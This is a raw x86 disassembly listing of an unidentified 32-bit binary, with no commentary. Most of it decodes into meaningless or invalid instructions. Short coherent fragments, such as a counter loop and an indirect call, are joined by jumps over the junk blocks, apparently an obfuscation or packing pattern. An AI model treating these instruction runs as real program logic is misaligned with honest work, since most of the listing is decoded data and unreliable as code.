  40e99c:	neg    DWORD PTR [edx+esi*2+0x3d2a2caa]
  40e9a3:	ja     0x40e9d1
  40e9a5:	std    
  40e9a6:	(bad)  
  40e9a7:	cld    
  40e9a8:	lea    ebx,[edi+0xb]
  40e9ab:	jecxz  0x40e9ec
  40e9ad:	inc    ebx
  40e9ae:	xor    bh,al
  40e9b0:	sub    eax,0xc1ab4532
  40e9b5:	jb     0x40e94a
  40e9b7:	rcl    BYTE PTR [ebp+0x344ee69],1
  40e9bd:	scas   al,BYTE PTR es:[edi]
  40e9be:	or     eax,0x816a1b69
  40e9c3:	sub    DWORD PTR [ebx-0x6d689d90],0xa02a7e0a
  40e9cd:	or     ch,BYTE PTR [edx+0x694113a]
  40e9d3:	adc    edi,edi
  40e9d5:	or     eax,0xdd20c177
  40e9da:	mov    eax,0x52454b7a
  40e9df:	js     0x40e9dd
  40e9e1:	push   esi
  40e9e2:	(bad)  
  40e9e3:	xchg   ecx,eax
  40e9e4:	xchg   DWORD PTR [ebx+0x6fd9f4c4],edi
  40e9ea:	mov    esp,0x3dae3538
  40e9ef:	sbb    BYTE PTR ds:0xa6c90fd4,ah
  40e9f5:	jp     0x40e9a5
  40e9f7:	mov    edx,0x1b223fe9
  40e9fc:	scas   eax,DWORD PTR es:[di]
  40e9fe:	adc    al,0xaf
  40ea00:	cmc    
  40ea01:	jg     0x7803d98
  40ea07:	add    DWORD PTR [eax],ebx
  40ea09:	or     al,BYTE PTR [ecx]
  40ea0b:	and    eax,0xb543fc4d
  40ea10:	inc    ebp
  40ea11:	cmp    DWORD PTR ds:[eax-0x384499f1],edx
  40ea18:	pop    ecx
  40ea19:	mul    edx
  40ea1b:	xor    bh,BYTE PTR [esi+0x14]
  40ea1e:	xlat   BYTE PTR ds:[ebx]
  40ea1f:	fisub  DWORD PTR [ebx-0x353c1d0a]
  40ea25:	jle    0x40e9cf
  40ea27:	out    dx,al
  40ea28:	cmp    DWORD PTR [esi+0x2f],esp
  40ea2b:	mov    ds:0xb17b517a,eax
  40ea30:	mov    eax,ds:0x41d26b65
  40ea35:	inc    ebx
  40ea36:	ret    0x20fd
  40ea39:	in     eax,dx
  40ea3a:	sub    al,0x63
  40ea3c:	dec    eax
  40ea3d:	mov    dl,0x40
  40ea3f:	test   al,0xfe
  40ea41:	test   al,0x8d
  40ea43:	retf   0x5954
  40ea46:	push   ebx
  40ea47:	mov    ch,BYTE PTR [ebp-0x53]
  40ea4a:	js     0x40e9f8
  40ea4c:	adc    al,0xcf
  40ea4e:	lahf   
  40ea4f:	cmc    
  40ea50:	sahf   
  40ea51:	jnp    0x40e9d7
  40ea53:	sbb    dl,dl
  40ea55:	out    0x64,al
  40ea57:	sahf   
  40ea58:	(bad)  
  40ea59:	imul   DWORD PTR [eax-0x71046ff8]
  40ea5f:	shl    dh,0x94
  40ea62:	pop    es
  40ea63:	dec    esp
  40ea64:	das    
  40ea65:	xchg   ebx,eax
  40ea66:	xchg   ecx,eax
  40ea67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea68:	(bad)  
  40ea69:	dec    ebp
  40ea6a:	cli    
  40ea6b:	jge    0x40ea15
  40ea6d:	(bad)  
  40ea6f:	sub    dx,ax
  40ea72:	push   ebx
  40ea73:	pop    ebp
  40ea74:	adc    eax,0xcb8707e4
  40ea79:	or     DWORD PTR [edi-0x77],edx
  40ea7c:	ror    DWORD PTR [ecx+0x3b11b8c1],0xf4
  40ea83:	mov    edi,0xbfcd7da2
  40ea88:	mov    edi,0xd010ffc6
  40ea8d:	lods   eax,DWORD PTR ds:[esi]
  40ea8e:	packssdw mm5,QWORD PTR [esi+0xe]
  40ea92:	shl    DWORD PTR [ecx+0x1f0f49d2],cl
  40ea98:	std    
  40ea99:	inc    esi
  40ea9a:	and    DWORD PTR [ebx+0x5c25f7fb],esi
  40eaa0:	pusha  
  40eaa1:	jl     0x40eab2
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xf5
  40eb8d:	mov    ah,0x25
  40eb8f:	mov    cl,0xf7
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ebe8
  40eb99:	dec    edx
  40eb9a:	jecxz  0x40ebbc
  40eb9c:	cmp    ah,BYTE PTR [ecx+0x27]
  40eb9f:	inc    ebx
  40eba0:	lods   eax,DWORD PTR ds:[esi]
  40eba1:	not    cl
  40eba3:	ror    BYTE PTR [edi],cl
  40eba5:	xor    BYTE PTR [esi],ah
  40eba7:	fwait
  40eba8:	sbb    eax,0x89c6b57a
  40ebad:	or     al,0x0
  40ebaf:	pop    ss
  40ebb0:	or     ebx,edx
  40ebb2:	mov    eax,ds:0x34108569
  40ebb7:	or     ah,BYTE PTR [ebp+0x36]
  40ebba:	sub    esp,esi
  40ebbc:	jle    0x40eb58
  40ebbe:	clc    
  40ebbf:	test   eax,0xfe736208
  40ebc4:	xchg   esi,eax
  40ebc5:	outs   dx,BYTE PTR ds:[esi]
  40ebc6:	inc    esp
  40ebc7:	outs   dx,BYTE PTR ds:[esi]
  40ebc8:	xchg   esp,eax
  40ebc9:	retf   0xcc89
  40ebcc:	pushf  
  40ebcd:	(bad)  
  40ebce:	jae    0x40ebc1
  40ebd0:	ds int3 
  40ebd2:	adc    BYTE PTR [esi],ah
  40ebd4:	addr16 mov cl,0x4a
  40ebd7:	(bad)  
  40ebd8:	sbb    DWORD PTR [ebx+0x604e5046],ebx
  40ebde:	dec    edx
  40ebdf:	(bad)  
  40ebe0:	cs dec ebp
  40ebe2:	jb     0x40eb96
  40ebe4:	sub    al,0xec
  40ebe6:	data16 adc cl,0x74
  40ebea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebeb:	lds    edx,FWORD PTR [ecx+0xe]
  40ebee:	pop    sp
  40ebf0:	sub    ch,BYTE PTR [edi-0x2ed8199e]
  40ebf6:	jae    0x40ebe9
  40ebf8:	jb     0x40ebd2
  40ebfa:	xor    eax,0x75e090a3
  40ebff:	sbb    esp,0xffffffcd
  40ec02:	xchg   esp,eax
  40ec03:	jbe    0x40ec70
  40ec05:	outs   dx,DWORD PTR ds:[esi]
  40ec06:	and    cl,BYTE PTR [edx+0x19118a68]
  40ec0c:	fimul  WORD PTR [edi+0x40]
  40ec0f:	fcmove st,st(0)
  40ec11:	xchg   ecx,eax
  40ec12:	stc    
  40ec13:	inc    edi
  40ec14:	fcom   DWORD PTR [ebx]
  40ec16:	xor    eax,ecx
  40ec18:	xor    al,0x55
  40ec1a:	sub    DWORD PTR [edx+ebx*4-0x24],esp
  40ec1e:	add    DWORD PTR [ecx-0x7c0c3c3c],esi
  40ec24:	pop    ebp
  40ec25:	sbb    al,0x6c
  40ec27:	bnd jne 0x40ec76
  40ec2a:	sbb    al,0x2d
  40ec2c:	stc    
  40ec2d:	mul    BYTE PTR ds:0x4d26648
  40ec33:	fsub   st,st(0)
  40ec35:	or     al,0x17
  40ec37:	cmp    DWORD PTR [ecx-0x18e9aedd],edi
  40ec3d:	pushf  
  40ec3e:	xchg   ebx,eax
  40ec3f:	xchg   edx,eax
  40ec40:	mov    dl,BYTE PTR [esi+0x3a93a95c]
  40ec46:	jo     0x40ebdb
  40ec48:	fild   DWORD PTR [edi]
  40ec4a:	xchg   BYTE PTR [esi-0x32],bl
  40ec4d:	mov    al,0x2a
  40ec4f:	retf   0x9e0f
  40ec52:	mov    bl,0x34
  40ec54:	inc    edx
  40ec55:	lds    esi,FWORD PTR [ecx-0x8b297e3]
  40ec5b:	xor    DWORD PTR [edx+esi*1-0x4781a6c0],esp
  40ec62:	std    
  40ec63:	imul   esp,esp,0x47
  40ec66:	add    BYTE PTR [ebx],cl
  40ec68:	out    dx,eax
  40ec69:	in     eax,dx
  40ec6a:	pushf  
  40ec6b:	xchg   DWORD PTR [esi-0x7e4b099c],esi
  40ec71:	jl     0x40ec85
  40ec73:	call   0xee7f:0x3982202f
  40ec7a:	push   ebp
  40ec7b:	inc    esi
  40ec7c:	(bad)  
  40ec7d:	push   edi
  40ec7e:	jno    0x40ec6c
  40ec80:	jns    0x40ecd4
  40ec82:	fidiv  DWORD PTR [edi-0x4bc7aebe]
  40ec88:	in     eax,dx
  40ec89:	ins    BYTE PTR es:[edi],dx
  40ec8a:	les    ebp,FWORD PTR [ebp-0x10]
  40ec8d:	push   eax
  40ec8e:	inc    edx
  40ec8f:	or     ah,ch
  40ec91:	hlt    
  40ec92:	sahf   
  40ec93:	fist   DWORD PTR [edx+edx*4+0x2c6e77ca]
  40ec9a:	lods   eax,DWORD PTR ds:[esi]
  40ec9b:	push   ebx
  40ec9c:	inc    esp
  40ec9d:	loopne 0x40ec2f
  40ec9f:	bound  edi,QWORD PTR [edi+0x35bef45d]
  40eca5:	add    DWORD PTR [ebx-0x7917dd2a],eax
  40ecab:	imul   eax,DWORD PTR [eax-0xc],0xfea315f9
  40ecb2:	pop    ebx
  40ecb3:	idiv   DWORD PTR [esi]
  40ecb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecb6:	pop    esi
  40ecb7:	xchg   DWORD PTR [eax+edx*4-0x34],ebx
  40ecbb:	loopne 0x40ecd9
  40ecbd:	sub    esp,esi
  40ecbf:	shl    BYTE PTR [eax-0x5c189bb0],cl
  40ecc5:	mov    WORD PTR [edx+0x42344080],gs
  40eccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eccc:	fnstcw WORD PTR [eax-0x750c9a84]
  40ecd2:	pop    eax
  40ecd3:	adc    DWORD PTR [edi],edi
  40ecd5:	xlat   BYTE PTR ds:[ebx]
  40ecd6:	outs   dx,DWORD PTR ds:[esi]
  40ecd7:	sub    eax,0xefccfd5
  40ecdc:	fadd   QWORD PTR [ecx-0x70301e1f]
  40ece2:	arpl   WORD PTR [ebx-0x34],ax
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed67
  40ed00:	lea    eax,[edi]
  40ed02:	push   es
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed0f
  40ed0c:	pop    esi
  40ed0d:	and    al,0xd1
  40ed0f:	in     al,0x84
  40ed11:	xlat   BYTE PTR ds:[ebx]
  40ed12:	js     0x40ed58
  40ed14:	inc    esi
  40ed15:	jge    0x40ecf2
  40ed17:	lea    edi,es:[ebx+0x37]
  40ed1b:	cmp    ah,cl
  40ed1d:	iret   
  40ed1e:	fwait
  40ed1f:	(bad)  
  40ed20:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed22:	xor    eax,0xb4b25440
  40ed27:	jno    0x40ed6f
  40ed29:	mov    ch,0xfb
  40ed2b:	ret    
  40ed2c:	in     eax,dx
  40ed2d:	aas    
  40ed2e:	icebp  
  40ed2f:	jnp    0x40ed9c
  40ed31:	stos   BYTE PTR es:[edi],al
  40ed32:	into   
  40ed33:	or     ebp,edi
  40ed35:	arpl   WORD PTR [edx+0x49f3be4a],si
  40ed3b:	inc    edi
  40ed3c:	inc    eax
  40ed3d:	mov    edi,0xb4ecf28f
  40ed42:	jg     0x40ecd8
  40ed44:	cmp    BYTE PTR [ecx],0x34
  40ed47:	mov    ch,0xf7
  40ed49:	fcom   QWORD PTR [ebx+0x36]
  40ed4c:	test   al,0x51
  40ed4e:	xchg   ebp,eax
  40ed4f:	sub    al,0x65
  40ed51:	shr    BYTE PTR [ebx+0x13],1
  40ed54:	out    0x62,eax
  40ed56:	sub    eax,ecx
  40ed58:	shr    ah,cl
  40ed5a:	jp     0x40eda3
  40ed5c:	and    DWORD PTR [ebp-0x7b],eax
  40ed5f:	jmp    0x40ed5d
  40ed61:	sbb    al,BYTE PTR [ecx]
  40ed63:	mov    esi,0x963502a8
  40ed68:	xor    edi,ebp
  40ed6a:	stos   BYTE PTR es:[edi],al
  40ed6b:	xchg   ecx,eax
  40ed6c:	dec    esp
  40ed6d:	sub    ebx,DWORD PTR [esi+0x11]
  40ed70:	adc    esp,edi
  40ed72:	pop    esp
  40ed73:	push   0x334e9dda
  40ed78:	lods   al,BYTE PTR ds:[esi]
  40ed79:	loope  0x40ed69
  40ed7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed7c:	mov    BYTE PTR [ebp+0x5a3fa736],ch
  40ed82:	jo     0x40ed0e
  40ed84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed85:	arpl   WORD PTR [eax+eiz*4+0x1b6c8b86],di
  40ed8c:	cmp    BYTE PTR [ecx-0x2e82a841],cl
  40ed92:	mov    ah,0xa1
  40ed94:	mov    esp,edx
  40ed96:	adc    al,0x81
  40ed98:	inc    DWORD PTR [eax+0x10]
  40ed9b:	or     dh,BYTE PTR [eax-0x3658ccc3]
  40eda1:	cmp    eax,0x21ed9485
  40eda6:	data16 cmp al,0xde
  40eda9:	int    0x81
  40edab:	imul   edx,ebx,0x78
  40edae:	adc    DWORD PTR [eax-0x2334b2bd],ecx
  40edb4:	bound  esp,QWORD PTR [edx+edx*2+0x36]
  40edb8:	xor    al,0x6e
  40edba:	add    ah,bl
  40edbc:	mov    ah,0x29
  40edbe:	xchg   ebp,eax
  40edbf:	fisub  WORD PTR [edx]
  40edc1:	xchg   ebx,eax
  40edc2:	scas   eax,DWORD PTR es:[edi]
  40edc3:	lock dec edi
  40edc5:	sar    edi,cl
  40edc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc8:	sub    al,0xf7
  40edca:	out    0x7,al
  40edcc:	call   0xda1d:0xde8700ba
  40edd3:	pop    ecx
  40edd4:	ds clc 
  40edd6:	push   esp
  40edd7:	cmp    edi,DWORD PTR [eax-0x243db264]
  40eddd:	retf   
  40edde:	xchg   edx,eax
  40eddf:	jl     0x40ed95
  40ede1:	inc    eax
  40ede2:	sub    BYTE PTR [ecx],dh
  40ede4:	jecxz  0x40ee4b
  40ede6:	add    al,0xa
  40ede8:	js     0x40edbc
  40edea:	sub    eax,0x8c427241
  40edef:	pop    edx
  40edf0:	out    0xad,eax
  40edf2:	inc    ebp
  40edf3:	cli    
  40edf4:	push   cs
  40edf5:	outs   dx,DWORD PTR ds:[esi]
  40edf6:	xchg   ebx,eax
  40edf7:	jg     0x40ee48
  40edf9:	je     0x40ee0f
  40edfb:	daa    
  40edfc:	xlat   BYTE PTR ds:[ebx]
  40edfd:	lea    esi,[esp+ebp*2-0x4a]
  40ee01:	push   es
  40ee02:	push   es
  40ee03:	mov    esp,0xcccb3feb
  40ee08:	in     al,dx
  40ee09:	cmp    eax,0x7cdc8a3
  40ee0e:	sahf   
  40ee0f:	dec    edi
  40ee10:	and    BYTE PTR [ecx],bl
  40ee12:	sbb    ecx,ebp
  40ee14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee15:	push   eax
  40ee16:	sbb    edx,DWORD PTR [ecx+0x605122d0]
  40ee1c:	rcr    DWORD PTR [ecx+0x36ff1993],0xb1
  40ee23:	add    eax,0x1590541f
  40ee28:	or     ch,cl
  40ee2a:	addr16 (bad) 
  40ee2c:	fcom   QWORD PTR ds:0x3a8068e5
  40ee32:	xor    al,0xdd
  40ee34:	lods   al,BYTE PTR ds:[esi]
  40ee35:	jns    0x40ee44
  40ee37:	bound  ebx,QWORD PTR [eax]
  40ee39:	imul   ebp,eax,0x7c16d9a4
  40ee3f:	add    ebp,DWORD PTR [edi-0x5d]
  40ee42:	pop    edx
  40ee43:	inc    edi
  40ee44:	mov    bl,0xa1
  40ee46:	or     al,0x74
  40ee48:	out    dx,al
  40ee49:	pop    ecx
  40ee4a:	push   esp
  40ee4b:	enter  0xc9bb,0x3e
  40ee4f:	mov    ebx,0x43862530
  40ee54:	or     BYTE PTR [ebp-0x70f04419],bl
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x16
  40ee7f:	jle    0x40ee27
  40ee81:	bound  ecx,QWORD PTR ds:0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eee3
  40ee8b:	loopne 0x40eef2
  40ee8d:	xchg   ebx,eax
  40ee8e:	ss or  eax,0xdbe23585
  40ee94:	(bad)  
  40ee95:	jge    0x40eeea
  40ee97:	mov    ah,0x4e
  40ee99:	in     eax,dx
  40ee9a:	pushf  
  40ee9b:	inc    BYTE PTR [ecx]
  40ee9d:	add    al,0x10
  40ee9f:	and    BYTE PTR [eax-0x169c5a14],ah
  40eea5:	inc    ecx
  40eea6:	jl     0x40eefe
  40eea8:	cmp    BYTE PTR [eax+eiz*2+0xf3252f2],ch
  40eeaf:	mov    al,0x6e
  40eeb1:	push   DWORD PTR [esi-0x72]
  40eeb4:	cli    
  40eeb5:	shl    DWORD PTR [ecx],cl
  40eeb7:	sub    BYTE PTR [edi+0x10],0xdd
  40eebb:	scas   eax,DWORD PTR es:[edi]
  40eebc:	loope  0x40eede
  40eebe:	retf   
  40eebf:	mov    WORD PTR [ecx],es
  40eec1:	mov    bl,0x7a
  40eec3:	pop    edx
  40eec4:	mov    fs:0x44ecb484,al
  40eeca:	fldenv [edx+0x12]
  40eecd:	stos   BYTE PTR es:[edi],al
  40eece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eecf:	ficomp WORD PTR [ebx+edi*4]
  40eed2:	sub    ebx,DWORD PTR [ebx+0x25817e71]
  40eed8:	jle    0x40ee71
  40eeda:	scas   al,BYTE PTR es:[edi]
  40eedb:	dec    esi
  40eedc:	shl    DWORD PTR [eax-0x4c4be569],0x3b
  40eee3:	rcl    BYTE PTR ds:0x8f0c67cf,1
  40eee9:	inc    ebp
  40eeea:	fisubr WORD PTR [edx+0x14f18527]
  40eef0:	xor    edi,DWORD PTR [ebx]
  40eef2:	leave  
  40eef3:	jge    0x40eed9
  40eef5:	pop    ecx
  40eef6:	or     eax,0x5774fd72
  40eefb:	dec    eax
  40eefc:	lods   al,BYTE PTR ds:[esi]
  40eefd:	mov    eax,ds:0x531ac3ee
  40ef02:	cmp    eax,0xc035f8b5
  40ef07:	xor    bh,cl
  40ef09:	push   edi
  40ef0a:	pop    ebp
  40ef0b:	push   0x229b2286
  40ef10:	jne    0x40ef7d
  40ef12:	cld    
  40ef13:	scas   al,BYTE PTR es:[edi]
  40ef14:	mov    esp,0x6a07b28
  40ef19:	jmp    0xc683:0xebf434e7
  40ef20:	add    ch,bl
  40ef22:	nop
  40ef23:	jb     0x40eeac
  40ef25:	mov    WORD PTR [eax-0x29d107f8],es
  40ef2b:	pop    eax
  40ef2c:	inc    esi
  40ef2d:	add    BYTE PTR [ebx-0x25],ah
  40ef30:	jl     0x40ef47
  40ef32:	add    esi,ecx
  40ef34:	pop    edi
  40ef35:	mov    ebx,0x655d6452
  40ef3a:	dec    esi
  40ef3b:	sbb    DWORD PTR ds:0x5e53,esi
  40ef40:	sti    
  40ef41:	in     al,dx
  40ef42:	fmul   DWORD PTR [edi]
  40ef44:	lock inc ebx
  40ef46:	lods   al,BYTE PTR ds:[esi]
  40ef47:	and    dl,BYTE PTR [ebx]
  40ef49:	pop    esp
  40ef4a:	(bad)  [edi-0x9]
  40ef4d:	dec    eax
  40ef4e:	jmp    0x11cd:0x159da61d
  40ef55:	rol    DWORD PTR [esi+0x59],cl
  40ef58:	sahf   
  40ef59:	lea    ecx,[esi]
  40ef5b:	lahf   
  40ef5c:	repz iret 
  40ef5e:	mov    esi,0xca8e849e
  40ef63:	and    ebx,DWORD PTR [edi+0x9]
  40ef66:	xor    bl,dl
  40ef68:	jns    0x40ef83
  40ef6a:	dec    edi
  40ef6b:	in     al,dx
  40ef6c:	cwde   
  40ef6d:	out    0x81,eax
  40ef6f:	pop    ecx
  40ef70:	pusha  
  40ef71:	pop    ss
  40ef72:	mov    esp,0xc5b590ad
  40ef77:	ret    0x4962
  40ef7a:	cdq    
  40ef7b:	mov    ah,0x49
  40ef7e:	ins    BYTE PTR es:[edi],dx
  40ef7f:	repz cmp eax,0x31129d86
  40ef85:	fldenv ds:0x9c679513
  40ef8b:	jp     0x40ef7a
  40ef8d:	ror    DWORD PTR [edx+ebp*2-0x69],1
  40ef91:	push   cs
  40ef92:	fist   DWORD PTR [ebp+0x6d]
  40ef95:	or     eax,0xec3231dd
  40ef9a:	jecxz  0x40f008
  40ef9c:	add    DWORD PTR ss:[edi+0x76a08e71],esi
  40efa3:	xchg   ebx,eax
  40efa4:	(bad)  
  40efa5:	fstp   st(4)
  40efa7:	shr    BYTE PTR [edi],0x43
  40efaa:	es add al,0xfd
  40efad:	jne    0x40eff1
  40efaf:	push   ebp
  40efb0:	retf   
  40efb1:	xlat   BYTE PTR ds:[ebx]
  40efb2:	xchg   esp,eax
  40efb3:	mov    dh,0xb4
  40efb5:	iret   
  40efb6:	test   DWORD PTR [ecx-0x3e211ace],ebp
  40efbc:	frstor [ebx]
  40efbe:	ret    0x35ff
  40efc1:	pop    edi
  40efc2:	ins    BYTE PTR es:[edi],dx
  40efc3:	lock inc ecx
  40efc5:	add    dh,dl
  40efc7:	xchg   ecx,eax
  40efc8:	pop    ss
  40efc9:	adc    al,0x14
  40efcb:	cwde   
  40efcc:	int3   
  40efcd:	js     0x40efc3
  40efcf:	add    bh,dl
  40efd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efd2:	cmc    
  40efd3:	or     al,cl
  40efd5:	shl    dl,1
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	push   esp
  40effb:	xchg   esp,eax
  40effc:	jp     0x40f00f
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	or     eax,DWORD PTR [ecx+0x20]
  40f009:	sti    
  40f00a:	iret   
  40f00b:	loopne 0x40f053
  40f00d:	sbb    dl,al
  40f00f:	es jno 0x40f06b
  40f012:	enter  0x3060,0xea
  40f016:	pop    ebp
  40f017:	cmp    DWORD PTR [eax-0x33],eax
  40f01a:	jo     0x40f024
  40f01c:	or     eax,0xfe1e1e81
  40f021:	xchg   ecx,eax
  40f022:	lock inc edi
  40f024:	test   eax,0x48c55924
  40f029:	add    al,0x8
  40f02b:	add    eax,ebx
  40f02d:	bound  edx,QWORD PTR [ebx-0x43e6ba78]
  40f033:	mov    ebx,0xe842cd87
  40f038:	aad    0x69
  40f03a:	sub    edi,0x6be37b59
  40f040:	outs   dx,BYTE PTR ds:[esi]
  40f041:	pop    ds
  40f042:	mov    dh,0xc
  40f044:	mov    ds:0xd96a81e,al
  40f049:	push   ss
  40f04a:	xchg   ecx,eax
  40f04b:	scas   eax,DWORD PTR es:[edi]
  40f04c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f04d:	das    
  40f04e:	ss test al,0x21
  40f051:	pop    edi
  40f052:	jp     0x40f04b
  40f054:	call   FWORD PTR ds:0x3223b09a
  40f05a:	arpl   WORD PTR [ebx+esi*4-0x330f9685],sp
  40f061:	push   es
  40f062:	pop    es
  40f063:	inc    edx
  40f064:	cmovne edi,edx
  40f067:	pop    ebp
  40f068:	sahf   
  40f069:	or     DWORD PTR [ecx-0x7b],ebp
  40f06c:	cwde   
  40f06d:	push   0x1b
  40f06f:	xchg   edi,eax
  40f070:	cmp    ch,al
  40f072:	call   0xe5d8debb
  40f077:	in     al,dx
  40f078:	hlt    
  40f079:	xor    eax,0x7d4f0de9
  40f07e:	add    BYTE PTR [edx],dl
  40f080:	push   0xffffffd5
  40f082:	inc    ecx
  40f083:	ins    BYTE PTR es:[edi],dx
  40f084:	sub    al,0xd8
  40f086:	adc    DWORD PTR [eax+edx*1],eax
  40f089:	(bad)  
  40f08a:	mov    edx,0x1ff9c80a
  40f08f:	enter  0x199d,0xfd
  40f093:	dec    ecx
  40f094:	mov    al,ds:0xea8185ee
  40f099:	adc    al,0x59
  40f09b:	push   eax
  40f09c:	pusha  
  40f09d:	xchg   DWORD PTR [eax],edi
  40f09f:	mov    ecx,0x42885970
  40f0a4:	pop    ebp
  40f0a5:	inc    ecx
  40f0a6:	xchg   esp,eax
  40f0a7:	mov    dh,0xa6
  40f0a9:	mov    edx,0xe69cf9e6
  40f0ae:	sti    
  40f0af:	push   ebx
  40f0b0:	lds    ecx,FWORD PTR [ecx-0x439d452e]
  40f0b6:	mov    al,0x95
  40f0b8:	js     0x40f0fb
  40f0ba:	ins    DWORD PTR es:[edi],dx
  40f0bb:	in     eax,dx
  40f0bc:	jae    0x40f06b
  40f0be:	in     al,0x67
  40f0c0:	jle    0x40f091
  40f0c2:	push   ebx
  40f0c3:	lock inc edx
  40f0c5:	es jle 0x40f085
  40f0c8:	out    dx,eax
  40f0c9:	push   0x33
  40f0cb:	je     0x40f09b
  40f0cd:	repnz adc ecx,esi
  40f0d0:	shl    BYTE PTR [edi-0x9],1
  40f0d3:	ins    BYTE PTR es:[edi],dx
  40f0d4:	pop    edi
  40f0d5:	(bad)  
  40f0d6:	popf   
  40f0d7:	fmulp  st(6),st
  40f0d9:	inc    esi
  40f0da:	popf   
  40f0db:	mov    edx,0xe2b6a243
  40f0e0:	mov    ch,0x9b
  40f0e2:	getsec 
  40f0e4:	push   cs
  40f0e5:	js     0x40f088
  40f0e7:	jp     0x40f0a1
  40f0e9:	(bad)  
  40f0ea:	jmp    0x40f0b2
  40f0ec:	aas    
  40f0ed:	stos   DWORD PTR es:[edi],eax
  40f0ee:	cmp    ch,cl
  40f0f0:	ins    BYTE PTR es:[edi],dx
  40f0f1:	and    dl,BYTE PTR [ebx+eax*2+0x73c75b49]
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	shl    BYTE PTR [edi+0x580e56d2],cl
  40f100:	cmp    ch,BYTE PTR [ebx-0xf4393d4]
  40f106:	int3   
  40f107:	fwait
  40f108:	lods   eax,DWORD PTR ds:[esi]
